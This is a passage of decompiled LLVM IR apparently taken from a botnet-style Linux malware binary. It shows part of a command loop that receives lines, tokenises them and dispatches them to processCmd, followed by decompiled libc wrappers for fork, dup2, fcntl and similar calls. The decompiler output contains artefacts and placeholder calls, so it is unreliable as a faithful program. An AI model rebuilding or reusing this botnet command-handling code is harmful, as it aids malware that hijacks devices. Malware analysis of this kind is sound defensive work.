  br i1 %v10_804da50, label %dec_label_pc_804dad9, label %dec_label_pc_804da58

dec_label_pc_804da58:                             ; preds = %dec_label_pc_804da4a
  %v4_804da4a = ptrtoint i8* %v3_804da5b to i32
  store i32 %stack_var_-40.142, i32* @ebx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804da4a, i32* @edi, align 4
  %v3_804da72 = call i32 @_strlen(i8* %v3_804da5b)
  %v1_804da76 = add i32 %v3_804da72, 1
  store i32 %v1_804da76, i32* %stack_var_-5888, align 4
  %v1_804da7d = call i32 @malloc(i32 %v1_804da76)
  %v1_804da82 = load i32, i32* @ebp, align 4
  %v2_804da82 = load i32, i32* @ebx, align 4
  %v3_804da82 = mul i32 %v2_804da82, 4
  %v4_804da82 = add i32 %v1_804da82, -616
  %v5_804da82 = add i32 %v4_804da82, %v3_804da82
  %v6_804da82 = inttoptr i32 %v5_804da82 to i32*
  store i32 %v1_804da7d, i32* %v6_804da82, align 4
  %v3_804da89 = load i8*, i8** %stack_var_-36, align 4
  %v4_804da89 = ptrtoint i8* %v3_804da89 to i32
  %v3_804daa0 = call i32 @_strlen(i8* %v3_804da89)
  %v1_804daa4 = add i32 %v3_804daa0, 1
  %v0_804daad = load i32, i32* @ebp, align 4
  %v2_804daad = mul i32 %stack_var_-40.142, 4
  %v3_804daad = add i32 %v2_804daad, -616
  %v4_804daad = add i32 %v0_804daad, %v3_804daad
  %v5_804daad = inttoptr i32 %v4_804daad to i32*
  %v6_804daad = load i32, i32* %v5_804daad, align 4
  %v1_804dab4 = inttoptr i32 %v6_804daad to i8*
  store i32 %v6_804daad, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804dab9 = and i32 %v6_804daad, -256
  %v5_804dabb = call i8* @_memset(i8* %v1_804dab4, i32 %v1_804dab9, i32 %v1_804daa4)
  %v6_804dabb = ptrtoint i8* %v5_804dabb to i32
  store i32 %v6_804dabb, i32* @ecx, align 4
  %v0_804dac3 = load i32, i32* @ebp, align 4
  %v4_804dac3 = add i32 %v0_804dac3, %v3_804daad
  %v5_804dac3 = inttoptr i32 %v4_804dac3 to i32*
  %v6_804dac3 = load i32, i32* %v5_804dac3, align 4
  store i32 %v6_804dac3, i32* @eax, align 4
  store i32 %v6_804dac3, i32* %stack_var_-5888, align 4
  %v3_804dad1 = inttoptr i32 %v6_804dac3 to i8*
  %v4_804dad1 = call i32 @strcpy(i8* %v3_804dad1, i32 %v4_804da89)
  store i32 %v4_804dad1, i32* @eax, align 4
  %v4_804dad6 = add i32 %stack_var_-40.142, 1
  br label %dec_label_pc_804dad9

dec_label_pc_804dad9:                             ; preds = %dec_label_pc_804da4a, %dec_label_pc_804da58
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.142, %dec_label_pc_804da4a ], [ %v4_804dad6, %dec_label_pc_804da58 ]
  store i32 0, i32* %stack_var_-5888, align 4
  %v3_804dae8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8056d47.150 to i32))
  store i32 %v3_804dae8, i32* %tmp122, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804daf0 = icmp eq i32 %v3_804dae8, 0
  %v1_804daf4 = icmp eq i1 %v5_804daf0, false
  %tmp124 = inttoptr i32 %v3_804dae8 to i8*
  br i1 %v1_804daf4, label %dec_label_pc_804da4a, label %dec_label_pc_804dafa

dec_label_pc_804dafa:                             ; preds = %dec_label_pc_804dad9, %dec_label_pc_804da1f
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_804da1f ], [ %stack_var_-40.0, %dec_label_pc_804dad9 ]
  store i32 %stack_var_-40.1.lcssa, i32* %stack_var_-5888, align 4
  %v4_804db0a = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v9_804db0f = icmp eq i32 %stack_var_-40.1.lcssa, 0
  store i1 %v9_804db0f, i1* %cf.global-to-local, align 1
  %v7_804db13 = icmp sgt i32 %stack_var_-40.1.lcssa, 1
  br i1 %v7_804db13, label %dec_label_pc_804db25.lr.ph, label %dec_label_pc_804db42.outer

dec_label_pc_804db25.lr.ph:                       ; preds = %dec_label_pc_804dafa
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804db25

dec_label_pc_804db25:                             ; preds = %dec_label_pc_804db25.lr.ph, %dec_label_pc_804db25
  %storemerge179 = phi i32 [ 1, %dec_label_pc_804db25.lr.ph ], [ %v4_804db37, %dec_label_pc_804db25 ]
  %v0_804db28 = load i32, i32* @ebp, align 4
  %v2_804db28 = mul i32 %storemerge179, 4
  %v3_804db28 = add i32 %v2_804db28, -616
  %v4_804db28 = add i32 %v3_804db28, %v0_804db28
  %v5_804db28 = inttoptr i32 %v4_804db28 to i32*
  %v6_804db28 = load i32, i32* %v5_804db28, align 4
  store i32 %v6_804db28, i32* %stack_var_-5888, align 4
  %v1_804db32 = call i32 @free(i32 %v6_804db28)
  %v4_804db37 = add nuw i32 %storemerge179, 1
  %v10_804db3d = icmp ult i32 %v4_804db37, %stack_var_-40.1.lcssa
  store i1 %v10_804db3d, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_804db37, %stack_var_-40.1.lcssa
  br i1 %exitcond, label %dec_label_pc_804db42.outer, label %dec_label_pc_804db25

dec_label_pc_804db42.outer:                       ; preds = %dec_label_pc_804db25, %dec_label_pc_804d924, %dec_label_pc_804dafa, %dec_label_pc_804d7cb, %dec_label_pc_804d794, %dec_label_pc_804d4a3
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_804d4a3 ], [ %stack_var_-96.1, %dec_label_pc_804d794 ], [ %stack_var_-96.1, %dec_label_pc_804d7cb ], [ %stack_var_-96.1, %dec_label_pc_804dafa ], [ %stack_var_-96.1, %dec_label_pc_804d924 ], [ %stack_var_-96.1, %dec_label_pc_804db25 ]
  br label %dec_label_pc_804db42

dec_label_pc_804db42:                             ; preds = %dec_label_pc_804db42.outer, %dec_label_pc_804d732
  %v0_804db48 = load i32, i32* @global_var_805a080.18, align 128
  store i32 %v0_804db48, i32* %stack_var_-5888, align 4
  %v5_804db5d = call i32 @recvLine(i32 %v0_804db48, i8* %tmp121, i32 4096)
  %v8_804db65 = icmp ne i32 %v5_804db5d, -1
  store i1 %v8_804db65, i1* %cf.global-to-local, align 1
  %v13_804db65 = icmp eq i32 %v5_804db5d, -1
  %v1_804db69 = icmp eq i1 %v13_804db65, false
  br i1 %v1_804db69, label %dec_label_pc_804d69d, label %dec_label_pc_804d48c.outer

; uselistorder directives
  uselistorder i32 %v5_804db5d, { 0, 2, 1 }
  uselistorder i32 %stack_var_-96.2.ph, { 0, 2, 1 }
  uselistorder i32 %v4_804db37, { 1, 0, 2 }
  uselistorder i32 %storemerge179, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v1_804da76, { 1, 0 }
  uselistorder i32 %stack_var_-40.142, { 0, 3, 2, 1 }
  uselistorder i8* %v3_804da5b, { 2, 1, 0 }
  uselistorder i32 %v4_804d982, { 2, 1, 3, 0 }
  uselistorder i1 %v0_804d90d, { 1, 0 }
  uselistorder i32 %v7_804d90b, { 1, 0 }
  uselistorder i8* %storemerge12, { 1, 0 }
  uselistorder i32 %v5_804d8ce, { 1, 0 }
  uselistorder i32 %v1_804d8c2, { 1, 0 }
  uselistorder i8* %storemerge12165, { 1, 0 }
  uselistorder i32 %v6_804d87b, { 1, 0 }
  uselistorder i32 %v6_804d852, { 1, 0 }
  uselistorder i32 %v6_804d82d, { 1, 0 }
  uselistorder i8* %v5_804d80a, { 5, 0, 3, 1, 2, 4, 6, 8, 7 }
  uselistorder i32 %v1_804d807, { 4, 5, 0, 1, 2, 6, 7, 3, 8 }
  uselistorder i32 %v6_804d804, { 1, 0 }
  uselistorder i8* %storemerge13.lcssa, { 1, 0 }
  uselistorder i32 %v4_804d76e, { 1, 2, 3, 0 }
  uselistorder i32 %storemerge14, { 2, 4, 0, 3, 1 }
  uselistorder i32 %v0_804d643, { 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0, 2 }
  uselistorder i32 %v2_804d610, { 1, 0 }
  uselistorder i32 %v1_804d5fc, { 1, 0 }
  uselistorder i32 %v2_804d5f3, { 1, 0 }
  uselistorder i32 %v0_804d5c8, { 1, 0 }
  uselistorder i32 %v0_804d56d, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 2, 0, 3 }
  uselistorder i8* %storemerge13127, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804d931, { 5, 4, 2, 3, 0, 1, 7, 6, 9, 8, 10 }
  uselistorder i8* %tmp121, { 2, 0, 1 }
  uselistorder i32 %v2_804db42, { 2, 0, 4, 6, 5, 1, 7, 9, 8, 10, 3 }
  uselistorder i32 %v1_804d3ef, { 1, 0, 2 }
  uselistorder i32 %v3_804d3a2, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_804d347, { 0, 2, 1 }
  uselistorder i32 %v2_804d328, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v7_804d2cb, { 1, 0 }
  uselistorder i32 %v2_804d28a, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 7, 6, 5, 1, 0, 3, 2, 4, 8 }
  uselistorder i32* %stack_var_-5888, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 38, 39, 36, 37, 2, 1, 40, 42, 43, 44, 41, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i8** %stack_var_-36, { 2, 1, 0 }
  uselistorder i1* %cf.global-to-local, { 32, 2, 53, 3, 5, 4, 51, 6, 54, 7, 8, 9, 10, 1, 11, 12, 0, 13, 14, 16, 17, 15, 18, 19, 20, 21, 55, 22, 23, 24, 25, 26, 27, 31, 56, 28, 29, 30, 33, 50, 48, 34, 49, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 52 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 3, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @szprintf, { 1, 0 }
  uselistorder i32 ()* @listFork, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i8 13, { 0, 2, 1 }
  uselistorder i8 33, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @Rootsprintf, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 16, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 1, 0 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8056c8f.139 to i32), { 0, 2, 1 }
  uselistorder [2 x i8]* @global_var_8056c80.137, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_8056c80.137 to i32), { 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 1, 2, 3, 4, 5, 6, 20, 21 }
  uselistorder i32 ptrtoint (i32* @global_var_8056c6c.135 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_804db42.outer, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_804db25, { 1, 0 }
  uselistorder label %dec_label_pc_804dad9, { 1, 0 }
  uselistorder label %dec_label_pc_804da4a, { 1, 0 }
  uselistorder label %dec_label_pc_804da1f, { 1, 0 }
  uselistorder label %dec_label_pc_804d98c, { 1, 0 }
  uselistorder label %dec_label_pc_804d8b6, { 1, 0 }
  uselistorder label %dec_label_pc_804d8a5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d89b, { 1, 0 }
  uselistorder label %dec_label_pc_804d834, { 1, 0 }
  uselistorder label %dec_label_pc_804d7cb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d7c1, { 1, 0 }
  uselistorder label %dec_label_pc_804d794, { 1, 0 }
  uselistorder label %dec_label_pc_804d69a, { 1, 0 }
  uselistorder label %dec_label_pc_804d62f, { 1, 0 }
  uselistorder label %dec_label_pc_804d60d, { 1, 0 }
  uselistorder label %dec_label_pc_804d559, { 1, 0 }
  uselistorder label %dec_label_pc_804d52f, { 1, 0 }
  uselistorder label %dec_label_pc_804d495, { 1, 0 }
  uselistorder label %dec_label_pc_804d48c.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d465, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d3ea, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804d2e9, { 1, 0 }
  uselistorder label %dec_label_pc_804d248, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_804db7a = call i32 @vfork()
  %v5_804db7d = icmp ult i32 %v0_804db7a, -4095
  %v1_804db82 = icmp eq i1 %v5_804db7d, false
  call void @__pseudo_cond_branch(i1 %v1_804db82, i32 134553152)
  ret i32 %v0_804db7a
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804db8c = load i32, i32* @edi, align 4
  %v0_804db8d = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg3, i32* @edx, align 4
  %v1_804dba5 = add i32 %arg2, -12
  %v6_804dbab = icmp ugt i32 %v1_804dba5, 2
  br i1 %v6_804dbab, label %dec_label_pc_804dbbb, label %dec_label_pc_804dbad

dec_label_pc_804dbad:                             ; preds = %entry
  %v4_804dbb1 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804dba5)
  br label %dec_label_pc_804dbdd

dec_label_pc_804dbbb:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804dbc3 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804dbc3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804dbc3, -4095
  br i1 %tmp, label %dec_label_pc_804dbdb, label %dec_label_pc_804dbcf

dec_label_pc_804dbcf:                             ; preds = %dec_label_pc_804dbbb
  %v1_804dbcf = call i32 @__errno_location(i32 %v0_804db8d)
  %v0_804dbd4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dbd4 = sub i32 0, %v0_804dbd4
  %v2_804dbd6 = inttoptr i32 %v1_804dbcf to i32*
  store i32 %v1_804dbd4, i32* %v2_804dbd6, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dbdb

dec_label_pc_804dbdb:                             ; preds = %dec_label_pc_804dbbb, %dec_label_pc_804dbcf
  %v0_804dbdb = phi i32 [ %v2_804dbc3, %dec_label_pc_804dbbb ], [ -1, %dec_label_pc_804dbcf ]
  br label %dec_label_pc_804dbdd

dec_label_pc_804dbdd:                             ; preds = %dec_label_pc_804dbad, %dec_label_pc_804dbdb
  %v0_804dbe2 = phi i32 [ %v4_804dbb1, %dec_label_pc_804dbad ], [ %v0_804dbdb, %dec_label_pc_804dbdb ]
  store i32 %v0_804db8d, i32* @ebx, align 4
  store i32 %v0_804db8c, i32* @edi, align 4
  ret i32 %v0_804dbe2

; uselistorder directives
  uselistorder i32 %v2_804dbc3, { 1, 0, 2 }
  uselistorder i32 %v0_804db8d, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804dbdd, { 1, 0 }
  uselistorder label %dec_label_pc_804dbdb, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dbe4 = load i32, i32* @edi, align 4
  store i32 %v0_804dbe4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804dbfc = load i32, i32* @ebx, align 4
  %v1_804dc04 = call i32 @int80_syscall(i32 221)
  store i32 %v1_804dc04, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804dc04, -4095
  br i1 %tmp, label %dec_label_pc_804dc1c, label %dec_label_pc_804dc10

dec_label_pc_804dc10:                             ; preds = %entry
  %v1_804dc10 = call i32 @__errno_location(i32 %v0_804dbfc)
  %v0_804dc15 = load i32, i32* %edi.global-to-local, align 4
  %v1_804dc15 = sub i32 0, %v0_804dc15
  %v2_804dc17 = inttoptr i32 %v1_804dc10 to i32*
  store i32 %v1_804dc15, i32* %v2_804dc17, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dc1c

dec_label_pc_804dc1c:                             ; preds = %entry, %dec_label_pc_804dc10
  %v0_804dc1f = phi i32 [ %v1_804dc04, %entry ], [ -1, %dec_label_pc_804dc10 ]
  %v2_804dc21 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dc21, i32* %edi.global-to-local, align 4
  ret i32 %v0_804dc1f

; uselistorder directives
  uselistorder i32 %v1_804dc04, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dc1c, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804dc25 = load i32, i32* @ebx, align 4
  store i32 %v0_804dc25, i32* %stack_var_-8, align 4
  %v5_804dc26 = icmp ult i32* %stack_var_-8, inttoptr (i32 4 to i32*)
  store i1 %v5_804dc26, i1* @cf, align 1
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dc4c = load i32, i32* @edi, align 4
  store i32 %v0_804dc4c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804dc54 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804dc5c = call i32 @chdir(i32 %v0_804dc54)
  store i32 %v0_804dc54, i32* @ebx, align 4
  store i32 %v1_804dc5c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804dc5c, -4095
  br i1 %tmp, label %dec_label_pc_804dc74, label %dec_label_pc_804dc68

dec_label_pc_804dc68:                             ; preds = %entry
  %v1_804dc68 = call i32 @__errno_location(i32 %v0_804dc54)
  %v0_804dc6d = load i32, i32* %edi.global-to-local, align 4
  %v1_804dc6d = sub i32 0, %v0_804dc6d
  %v2_804dc6f = inttoptr i32 %v1_804dc68 to i32*
  store i32 %v1_804dc6d, i32* %v2_804dc6f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dc74

dec_label_pc_804dc74:                             ; preds = %entry, %dec_label_pc_804dc68
  %v0_804dc75 = phi i32 [ %v1_804dc5c, %entry ], [ -1, %dec_label_pc_804dc68 ]
  %v2_804dc74 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dc74, i32* @edx, align 4
  %v2_804dc78 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dc78, i32* @edi, align 4
  ret i32 %v0_804dc75

; uselistorder directives
  uselistorder i32 %v1_804dc5c, { 1, 0, 2 }
  uselistorder i32 %v0_804dc54, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804dc74, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dc7c = load i32, i32* @edi, align 4
  store i32 %v0_804dc7c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804dc84 = load i32, i32* @ebx, align 4
  %v1_804dc8c = call i32 @close(i32 %arg1)
  store i32 %v0_804dc84, i32* @ebx, align 4
  store i32 %v1_804dc8c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804dc8c, -4095
  br i1 %tmp, label %dec_label_pc_804dca4, label %dec_label_pc_804dc98

dec_label_pc_804dc98:                             ; preds = %entry
  %v1_804dc98 = call i32 @__errno_location(i32 %v0_804dc84)
  %v0_804dc9d = load i32, i32* %edi.global-to-local, align 4
  %v1_804dc9d = sub i32 0, %v0_804dc9d
  %v2_804dc9f = inttoptr i32 %v1_804dc98 to i32*
  store i32 %v1_804dc9d, i32* %v2_804dc9f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dca4

dec_label_pc_804dca4:                             ; preds = %entry, %dec_label_pc_804dc98
  %v0_804dca5 = phi i32 [ %v1_804dc8c, %entry ], [ -1, %dec_label_pc_804dc98 ]
  %v2_804dca4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dca4, i32* @edx, align 4
  %v2_804dca8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dca8, i32* @edi, align 4
  ret i32 %v0_804dca5

; uselistorder directives
  uselistorder i32 %v1_804dc8c, { 1, 0, 2 }
  uselistorder i32 %v0_804dc84, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804dca4, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804dcac = load i32, i32* @ebx, align 4
  store i32 %v0_804dcac, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804dcbf = call i32 @dup2(i32 %v0_804dcac, i32 %tmp4)
  store i32 %v2_804dcbf, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804dcbf, -4095
  br i1 %tmp, label %dec_label_pc_804dcd8, label %dec_label_pc_804dccc

dec_label_pc_804dccc:                             ; preds = %entry
  %v0_804dccc = load i32, i32* %stack_var_-4, align 4
  %v1_804dccc = call i32 @__errno_location(i32 %v0_804dccc)
  %v0_804dcd1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dcd1 = sub i32 0, %v0_804dcd1
  %v2_804dcd3 = inttoptr i32 %v1_804dccc to i32*
  store i32 %v1_804dcd1, i32* %v2_804dcd3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dcd8

dec_label_pc_804dcd8:                             ; preds = %entry, %dec_label_pc_804dccc
  %v0_804dcd9 = phi i32 [ %v2_804dcbf, %entry ], [ -1, %dec_label_pc_804dccc ]
  %v2_804dcdc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dcdc, i32* @ebx, align 4
  ret i32 %v0_804dcd9

; uselistorder directives
  uselistorder i32 %v2_804dcbf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804dcd8, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dce0 = load i32, i32* @ebx, align 4
  store i32 %v0_804dce0, i32* %stack_var_-4, align 4
  %v1_804dce9 = call i32 @fork(i32 %v0_804dce0)
  store i32 %v1_804dce9, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804dce9, -4095
  br i1 %tmp, label %dec_label_pc_804dd00, label %dec_label_pc_804dcf4

dec_label_pc_804dcf4:                             ; preds = %entry
  %v0_804dcf4 = load i32, i32* %stack_var_-4, align 4
  %v1_804dcf4 = call i32 @__errno_location(i32 %v0_804dcf4)
  %v0_804dcf9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dcf9 = sub i32 0, %v0_804dcf9
  %v2_804dcfb = inttoptr i32 %v1_804dcf4 to i32*
  store i32 %v1_804dcf9, i32* %v2_804dcfb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dd00

dec_label_pc_804dd00:                             ; preds = %entry, %dec_label_pc_804dcf4
  %v0_804dd01 = phi i32 [ %v1_804dce9, %entry ], [ -1, %dec_label_pc_804dcf4 ]
  %v2_804dd00 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dd00, i32* @edx, align 4
  %v2_804dd04 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dd04, i32* @ebx, align 4
  ret i32 %v0_804dd01

; uselistorder directives
  uselistorder i32 %v1_804dce9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dd00, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-44, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %v0_804dd08 = load i32, i32* @ebp, align 4
  %v0_804dd09 = load i32, i32* @edi, align 4
  %v0_804dd0a = load i32, i32* @esi, align 4
  %v0_804dd0b = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804dd17 = icmp eq i32 %arg2, 0
  %v1_804dd19 = icmp eq i1 %v1_804dd17, false
  %v1_804dd43 = icmp eq i32 %arg1, 0
  br i1 %v1_804dd19, label %dec_label_pc_804dd43, label %dec_label_pc_804dd1b

dec_label_pc_804dd1b:                             ; preds = %entry
  br i1 %v1_804dd43, label %dec_label_pc_804dd2f, label %dec_label_pc_804dd1f

dec_label_pc_804dd1f:                             ; preds = %dec_label_pc_804dd1b
  %v1_804dd1f = call i32 @__errno_location(i32 %v0_804dd0b)
  %v1_804dd24 = inttoptr i32 %v1_804dd1f to i32*
  store i32 22, i32* %v1_804dd24, align 4
  br label %dec_label_pc_804ddb4

dec_label_pc_804dd2f:                             ; preds = %dec_label_pc_804dd1b
  %v3_804dd2f = call i32 @__GI_getpagesize(i32 %v0_804dd0b, i32 %v0_804dd0a, i32 %v0_804dd09)
  %v1_804dd39 = add i32 %v3_804dd2f, -4096
  %v3_804dd39 = sub i32 4095, %v3_804dd2f
  %v4_804dd39 = and i32 %v3_804dd39, %v3_804dd2f
  %v5_804dd39 = icmp slt i32 %v4_804dd39, 0
  %v7_804dd39 = icmp slt i32 %v1_804dd39, 0
  %v2_804dd3e = icmp eq i1 %v7_804dd39, %v5_804dd39
  %v5_804dd3e = select i1 %v2_804dd3e, i32 %v3_804dd2f, i32 4096
  store i32 %v5_804dd3e, i32* @ebx, align 4
  br label %dec_label_pc_804dd4b

dec_label_pc_804dd43:                             ; preds = %entry
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804dd49 = icmp eq i1 %v1_804dd43, false
  br i1 %v1_804dd49, label %dec_label_pc_804dd5d, label %dec_label_pc_804dd4b

dec_label_pc_804dd4b:                             ; preds = %dec_label_pc_804dd43, %dec_label_pc_804dd2f
  %v0_804dd4e = phi i32 [ %arg2, %dec_label_pc_804dd43 ], [ %v5_804dd3e, %dec_label_pc_804dd2f ]
  store i32 %v0_804dd4e, i32* %stack_var_-44, align 4
  %v1_804dd4f = call i32 @malloc(i32 %v0_804dd4e)
  %v1_804dd57 = icmp eq i32 %v1_804dd4f, 0
  store i32 %v1_804dd4f, i32* @esi, align 4
  br i1 %v1_804dd57, label %dec_label_pc_804ddb4, label %dec_label_pc_804dd4b.dec_label_pc_804dd5d_crit_edge

dec_label_pc_804dd4b.dec_label_pc_804dd5d_crit_edge: ; preds = %dec_label_pc_804dd4b
  %v0_804dd68.pre = load i32, i32* %stack_var_-44, align 4
  br label %dec_label_pc_804dd5d

dec_label_pc_804dd5d:                             ; preds = %dec_label_pc_804dd4b.dec_label_pc_804dd5d_crit_edge, %dec_label_pc_804dd43
  %v0_804dd68 = phi i32 [ %v0_804dd68.pre, %dec_label_pc_804dd4b.dec_label_pc_804dd5d_crit_edge ], [ %tmp12, %dec_label_pc_804dd43 ]
  %v0_804dd5d = phi i32 [ %v1_804dd4f, %dec_label_pc_804dd4b.dec_label_pc_804dd5d_crit_edge ], [ %arg1, %dec_label_pc_804dd43 ]
  store i32 %v0_804dd5d, i32* @ebx, align 4
